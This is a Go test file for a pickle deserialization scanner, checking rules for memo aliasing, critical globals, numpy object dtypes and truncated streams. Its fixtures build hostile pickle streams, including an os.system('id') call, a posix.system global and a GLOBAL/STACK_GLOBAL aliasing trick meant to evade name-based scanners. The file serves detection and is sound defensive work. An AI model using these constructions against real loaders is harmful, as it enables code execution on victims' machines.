	// Two routes to one name: written literally by GLOBAL, then assembled from
	// strings by STACK_GLOBAL. A scanner keyed on the literal spelling and a
	// loader that resolves the assembled one disagree about what the stream calls.
	data = []byte{opPROTO, 2, opGLOBAL}
	data = append(data, []byte("pickle\nloads\n")...)
	data = append(data, opBINPUT, 0)
	data = append(data, binUnicode("pickle")...)
	data = append(data, binUnicode("loads")...)
	data = append(data, opSTACK_GLOBAL)
	data = append(data, opBINPUT, 1, opSTOP)
	_, fs = walk(t, data)
	mustHave(t, fs, "SC4N-PICKLE-MEMO-ALIAS")
	for _, f := range fs {
		if f.RuleID != "SC4N-PICKLE-MEMO-ALIAS" {
			continue
		}
		if !strings.Contains(f.Evidence, "pickle.loads (assembled)") ||
			!strings.Contains(f.Evidence, "2 distinct bindings") {
			t.Fatalf("evidence = %q, want both routes named", f.Evidence)
		}
		if !strings.Contains(f.Evidence, "[0 1]") {
			t.Fatalf("evidence = %q, want the distinct slots [0 1]", f.Evidence)
		}
	}
}

// TestMemoAliasIgnoresInstanceBindings is the regression for counting every value
// that *carries* a name rather than every name. Val.global is set on kInstance too
// (the class an object was built from), so an ordinary protocol-4/5 class +
// instance pair — pickle.dumps(Evil(), 4), and every real numpy or joblib stream —
// reported SC4N-PICKLE-MEMO-ALIAS "bound in 2 memo slots" for a name the stream
// binds exactly once. A name-based allowlist scanner sees one STACK_GLOBAL, so
// there was no evasion to report.
func TestMemoAliasIgnoresInstanceBindings(t *testing.T) {
	// PROTO 4, STACK_GLOBAL os/system, ('id',), REDUCE, MEMOIZE, STOP: one name
	// and one instance built from it, each in its own memo slot.
	data := []byte{opPROTO, 4}
	data = append(data, binUnicode("os")...)
	data = append(data, binUnicode("system")...)
	data = append(data, opSTACK_GLOBAL)
	data = append(data, binUnicode("id")...)
	data = append(data, opTUPLE1)
	data = append(data, opREDUCE)
	data = append(data, opMEMOIZE)
	data = append(data, opSTOP)

	_, fs := walk(t, data)
	mustNotHave(t, fs, "SC4N-PICKLE-MEMO-ALIAS")
	// The call itself is still reported; the fix must not silence the stream.
	mustHave(t, fs, "SC4N-PICKLE-GLOBAL-CRITICAL")
}

// TestMemoOverwriteEmitsOncePerStream pins the bounded-emission fix: the emit key
// used to embed the rebinding counter, which made it unique per rebinding, so a
// 400 KB stream of BINPUT 0 produced 100000 findings (479 MB resident) instead of
// one. The single finding must still carry the final count.
func TestMemoOverwriteEmitsOncePerStream(t *testing.T) {
	data := []byte{opPROTO, 2, opNONE}
	for range 2000 {
		data = append(data, opBINPUT, 0)
	}
	data = append(data, opSTOP)

	_, fs := walk(t, data)
	n := 0
	var ev string
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-MEMO-ALIAS" {
			n++
			ev = f.Evidence
		}
	}
	if n != 1 {
		t.Fatalf("SC4N-PICKLE-MEMO-ALIAS emitted %d times, want 1", n)
	}
	if !strings.Contains(ev, "1999 rebinding(s)") {
		t.Fatalf("evidence = %q, want the final rebinding count", ev)
	}
}

// TestSharedEmitKeysKeepDistinctFindings pins the F18 fix: the four opcode pairs
// that share a verb used to collapse into one finding, and a code string's key
// omitted its offset.
func TestSharedEmitKeysKeepDistinctFindings(t *testing.T) {
	// SETITEM into a string, then SETITEMS into a list: two different target-type
	// violations, two findings.
	data := []byte{opPROTO, 2, opEMPTY_LIST}
	data = append(data, binUnicode("key")...)
	data = append(data, binUnicode("value")...)
	data = append(data, opSETITEM)
	data = append(data, opEMPTY_LIST, opMARK)
	data = append(data, binUnicode("k")...)
	data = append(data, binUnicode("v")...)
	data = append(data, opSETITEMS, opSTOP)

	_, fs := walk(t, data)
	n := 0
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-SETITEM-TARGET" {
			n++
		}
	}
	if n != 2 {
		t.Fatalf("SETITEM + SETITEMS produced %d finding(s), want 2: %v", n, ruleIDs(fs))
	}
}

// decodeLongForTest runs one LONG1 argument through the walker's decoder.
func decodeLongForTest(t *testing.T, raw []byte) int64 {
	t.Helper()
	data := append([]byte{opLONG1, byte(len(raw))}, raw...)
	data = append(data, opSTOP)
	w := &walker{data: data, lim: limits.Default(), mm: newMemo(len(data)), once: map[string]bool{}, structs: map[string]*structStat{}}
	got, _, err := w.decodeArg(opTable[opLONG1], 0)
	if err != nil {
		t.Fatalf("LONG1 % x: %v", raw, err)
	}
	n, ok := got.(int64)
	if !ok {
		t.Fatalf("LONG1 % x decoded to %T, want an int64", raw, got)
	}
	return n
}

// TestCountedLongKeepsTheHighBytes pins the documented narrowing for a value that
// does not fit an int64: the fold keeps the most significant eight bytes, so the
// sign survives and the magnitude is a floor of the true one. CPython's
// _decode_long would produce the exact value; the walker needs only a scalar for
// the stack, and an attacker-controlled thousand-digit integer must not cost an
// allocation.
func TestCountedLongKeepsTheHighBytes(t *testing.T) {
	// 2**80 is eleven little-endian bytes: ten zeroes and 0x01. The eight bytes the
	// fold keeps are therefore the top ones, and the result is 2**80 >> 24 = 2**56.
	wide := make([]byte, 11)
	wide[10] = 0x01
	if got := decodeLongForTest(t, wide); got != 1<<56 {
		t.Fatalf("2**80 in eleven bytes decoded to %d, want %d", got, int64(1)<<56)
	}
	// A negative value wider than eight bytes has no int64 representation, so it is
	// clamped rather than reported as a positive number the stream does not contain.
	neg := make([]byte, 9)
	for i := range neg {
		neg[i] = 0xff
	}
	if got := decodeLongForTest(t, neg); got != math.MinInt64 {
		t.Fatalf("a nine-byte 0xff..ff decoded to %d, want MinInt64", got)
	}
}

// TestCountedLongMatchesTheLoader: CPython's _decode_long folds the bytes and then
// subtracts 1 << (8*len(data)) when the top bit is set, so a one-byte 0xff is -1.
// The walker computed -(v & MaxInt64), which reported -255 for the same bytes.
func TestCountedLongMatchesTheLoader(t *testing.T) {
	for _, tc := range []struct {
		raw  []byte
		want int64
	}{
		{[]byte{0xff}, -1},
		{[]byte{0x00}, 0},
		{[]byte{0x7f}, 127},
		{[]byte{0x80}, -128},
		{[]byte{0xff, 0xff}, -1},
		{[]byte{0x00, 0x01}, 256},
		{[]byte{0xff, 0xfe}, -257},
		{[]byte{0x00, 0x00, 0x01}, 65536},
	} {
		data := append([]byte{opLONG1, byte(len(tc.raw))}, tc.raw...)
		data = append(data, opSTOP)
		_, fs := walk(t, data)
		want := strconv.FormatInt(tc.want, 10)
		found := false
		for _, f := range fs {
			if strings.Contains(f.Evidence, want) || strings.Contains(f.Extra["value"], want) {
				found = true
			}
		}
		// The stack value reaches a finding only when it is consumed, so assert on
		// the decoded value directly as well.
		if got := decodeLongForTest(t, tc.raw); got != tc.want {
			t.Errorf("LONG1 % x decoded to %d, want %d (finding match: %v)", tc.raw, got, tc.want, found)
		}
	}
}

// TestMemoizeIndexCountsDistinctSlots: MEMOIZE stores at len(memo), the loader's
// dict size, which counts distinct slots. The walker used len(slots), and a
// BINPUT to a high index pre-grows the slice, so the two disagreed and the
// MEMOIZE'd value landed in a slot nothing could read.
func TestMemoizeIndexCountsDistinctSlots(t *testing.T) {
	// PROTO 2, NONE, LONG_BINPUT 999 (pre-grows the slice), NONE, MEMOIZE, then
	// BINGET of the slot MEMOIZE must have used. One distinct slot is set by the
	// LONG_BINPUT, so the loader's memo has one entry and MEMOIZE writes slot 1
	// (CPython: pickle.loads(b'\x80\x02Nr\xe7\x03\x00\x00N\x94h\x01.') is None
	// while BINGET 2 raises "Memo value not found at index 2").
	data := []byte{opPROTO, 2, opNONE, opLONG_BINPUT, 0xe7, 0x03, 0, 0, opNONE, opMEMOIZE, opBINGET, 1, opSTOP}
	_, fs := walk(t, data)
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-STRUCT" && strings.Contains(f.Evidence, "memo-hole") {
			t.Fatalf("BINGET of the MEMOIZE slot did not resolve: %s", f.Evidence)
		}
	}
	// A BINGET of the index len(slots) would have produced (1001) is a hole, which
	// is what the fix removes from a correctly-encoded stream.
	data = []byte{opPROTO, 2, opNONE, opLONG_BINPUT, 0xe7, 0x03, 0, 0, opNONE, opMEMOIZE, opLONG_BINGET, 0xe9, 0x03, 0, 0, opSTOP}
	_, fs = walk(t, data)
	hole := false
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-STRUCT" && strings.Contains(f.Evidence, "memo-hole") {
			hole = true
		}
	}
	if !hole {
		t.Fatal("a BINGET of a slot no write reached was not reported")
	}
}

// TestQuoteDoesNotReserveForTheWholeInput: quote truncates to 160 runes, so it must
// not reserve space for a 1 MiB argument. TotalAlloc is the observable: a Grow of
// the input length would show up as a megabyte of allocation.
func TestQuoteDoesNotReserveForTheWholeInput(t *testing.T) {
	big := strings.Repeat("A", 1<<20)
	var got string
	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	got = quote(big)
	runtime.ReadMemStats(&after)
	if len(got) > 200 {
		t.Fatalf("quote returned %d bytes for a truncated value", len(got))
	}
	if grown := after.TotalAlloc - before.TotalAlloc; grown > 1<<16 {
		t.Fatalf("quote allocated %d bytes for a 1 MiB input", grown)
	}
}

// TestLargeMemoIndexDoesNotAllocateTheTable: LONG_BINPUT carries an
// attacker-chosen index, and a stream of a dozen bytes must not make the walker
// allocate the dense memo table for it. TotalAlloc is the observable: growing the
// slice to the index would show up as tens of megabytes.
func TestLargeMemoIndexDoesNotAllocateTheTable(t *testing.T) {
	// PROTO 2, NONE, LONG_BINPUT 0x000FFFFF, STOP.
	data := []byte{opPROTO, 2, opNONE, opLONG_BINPUT, 0xff, 0xff, 0x0f, 0x00, opSTOP}
	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	_, fs := walk(t, data)
	runtime.ReadMemStats(&after)
	for _, f := range fs {
		if f.RuleID == "SC4N-PICKLE-STRUCT" {
			t.Fatalf("a legal high memo index was reported: %s", f.Evidence)
		}
	}
	if grown := after.TotalAlloc - before.TotalAlloc; grown > 4<<20 {
		t.Fatalf("a %d-byte stream allocated %d bytes for its memo table", len(data), grown)
	}
}

// TestTruncatedValueStopsTheStreamWithoutFabricatingOpcodes pins the boundary
// between "the bytes are not opcodes" (resync, so a payload after a junk prefix is
// still found) and "the value swallowed the rest of the stream" (stop, because a
// reference unpickler raises "pickle data was truncated" there and reads no
// further). Measured on a 2 MiB slice of an 8 MB sklearn pickle, resyncing inside
// the truncated value produced 3871 medium and 4 critical findings, among them a
// PERSID whose id was thirty zero bytes.
func TestTruncatedValueStopsTheStreamWithoutFabricatingOpcodes(t *testing.T) {
	// PROTO 4, BINBYTES declaring 4 KiB with 8 bytes present, then bytes that a
	// resync would read as PERSID ("P" + a text id).
	data := []byte{opPROTO, 4, opBINBYTES, 0, 0, 0x10, 0x00, 1, 2, 3, 4, 5, 6, 7, 8}
	data = append(data, 'P')
	data = append(data, []byte("evil\n")...)

	_, fs := walk(t, data)
	mustHave(t, fs, "SC4N-PICKLE-INCOMPLETE", "SC4N-PICKLE-STRUCT")
	if hasRule(fs, "SC4N-PICKLE-PERSID") {
		t.Fatalf("the walk resynced inside a truncated value and read the payload as opcodes: %v", ruleIDs(fs))
	}
	if len(fs) > 3 {
		t.Fatalf("%d findings from a 21-byte truncated stream: %v", len(fs), ruleIDs(fs))
	}
}

// onlyFinding returns the single finding with the given rule ID.
func onlyFinding(t *testing.T, fs []report.Finding, id string) report.Finding {
	t.Helper()
	var out []report.Finding
	for _, f := range fs {
		if f.RuleID == id {
			out = append(out, f)
		}
	}
	if len(out) != 1 {
		t.Fatalf("%s findings = %d, want 1; all = %v", id, len(out), ruleIDs(fs))
	}
	return out[0]
}

func TestConstructionRulesSummarisePerStream(t *testing.T) {
	newObj := func(module, name string) []byte {
		return append(append([]byte{opGLOBAL}, module+"\n"+name+"\n"...), opEMPTY_TUPLE, opNEWOBJ)
	}
	build := func(module, name string) []byte {
		return append(newObj(module, name), opEMPTY_DICT, opBUILD, opPOP)
	}
	data := []byte{opPROTO, 2}
	data = append(data, newObj("a.b", "C")...)
	data = append(data, newObj("a.b", "D")...)
	data = append(data, newObj("a.b", "E")...)
	data = append(data, newObj("a.b", "C")...)
	data = append(data, build("a.b", "C")...)
	data = append(data, build("a.b", "D")...)
	data = append(data, opSTOP)

	_, fs := walk(t, data)
	n := onlyFinding(t, fs, ruleNewObj.ID)
	if got := n.Extra["classes"]; got != "3" {
		t.Fatalf("NEWOBJ classes = %q, want 3", got)
	}
	if got := n.Extra["first"]; got != "a.b.C" {
		t.Fatalf("NEWOBJ first = %q", got)
	}
	if got := n.Extra["names"]; got != "a.b.C,a.b.D,a.b.E" {
		t.Fatalf("NEWOBJ names = %q", got)
	}
	b := onlyFinding(t, fs, ruleBuildState.ID)
	if got := b.Extra["classes"]; got != "2" {
		t.Fatalf("BUILD classes = %q, want 2", got)
	}
	if got := b.Extra["names"]; got != "a.b.C,a.b.D" {
		t.Fatalf("BUILD names = %q", got)
	}
}

func TestUnknownGlobalsSummarisePerStream(t *testing.T) {
	data := []byte{opPROTO, 2}
	for _, g := range [][2]string{{"a.b", "C"}, {"a.b", "D"}, {"a.b", "C"}, {"posix", "system"}} {
		data = append(data, opGLOBAL)
		data = append(data, g[0]+"\n"+g[1]+"\n"...)
	}
	data = append(data, opSTOP)

	_, fs := walk(t, data)
	u := onlyFinding(t, fs, ruleGlobalUnknown.ID)
	if got := u.Extra["globals"]; got != "2" {
		t.Fatalf("GLOBAL-UNKNOWN globals = %q, want 2", got)
	}
	if got := u.Extra["names"]; got != "a.b.C,a.b.D" {
		t.Fatalf("GLOBAL-UNKNOWN names = %q", got)
	}
	c := onlyFinding(t, fs, ruleGlobalCritical.ID)
	if !strings.Contains(c.Evidence, "posix.system") {
		t.Fatalf("critical evidence = %q", c.Evidence)
	}
}

func TestNumpyReconstructCriticalRequiresObjectDtype(t *testing.T) {
	global := func(module, name string) []byte {
		return append([]byte{opGLOBAL}, module+"\n"+name+"\n"...)
	}
	// dtypeArg is the third element of _reconstruct's argument tuple: either a
	// bare dtype string or a numpy.dtype instance built by a nested REDUCE.
	stream := func(dtypeArg ...[]byte) []byte {
		data := append([]byte{opPROTO, 2}, global("numpy.core.multiarray", "_reconstruct")...)
		data = append(data, opEMPTY_DICT, opEMPTY_TUPLE)
		for _, p := range dtypeArg {
			data = append(data, p...)
		}
		return append(data, opTUPLE3, opREDUCE, opSTOP)
	}
	dtypeInstance := func(spec string) [][]byte {
		out := global("numpy", "dtype")
		out = append(out, binUnicode(spec)...)
		out = append(out, opTUPLE1, opREDUCE)
		return [][]byte{out}
	}

	for _, tc := range []struct {
		name     string
		stream   []byte
		critical bool
	}{
		{"float dtype", stream(binUnicode("f4")), false},
		{"object dtype", stream(binUnicode("O")), true},
		{"object dtype spelled out", stream(binUnicode("object")), true},
		{"float dtype instance", stream(dtypeInstance("f4")...), false},
		{"object dtype instance", stream(dtypeInstance("O")...), true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, fs := walk(t, tc.stream)
			mustHave(t, fs, ruleReduce.ID)
			if tc.critical {
				c := onlyFinding(t, fs, ruleGlobalCritical.ID)
				if !strings.Contains(c.Evidence, "object-dtype") {
					t.Fatalf("critical evidence = %q", c.Evidence)
				}
				return
			}
			mustNotHave(t, fs, ruleGlobalCritical.ID)
			onlyFinding(t, fs, ruleGlobalUnknown.ID)
		})
	}
}
